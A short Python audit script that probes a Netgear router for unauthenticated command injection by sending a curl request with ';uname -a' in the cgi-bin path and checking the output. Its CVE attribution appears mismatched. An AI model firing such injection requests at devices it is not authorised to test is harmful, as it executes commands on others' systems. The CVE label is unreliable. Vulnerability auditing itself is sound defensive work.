# netgear_audit.py
import subprocess

def audit_netgear(ip="192.168.1.1"):
    # Test for CVE-2021-34991 (unauth RCE)
    try:
        vuln_check = subprocess.run(
            ["curl", "-s", f"http://{ip}/cgi-bin/;uname%20-a"],
            capture_output=True, text=True, timeout=5
        )
        if "Linux" in vuln_check.stdout:
            print("[!] CRITICAL: Vulnerable to CVE-2021-34991")
    except:
        pass

audit_netgear()

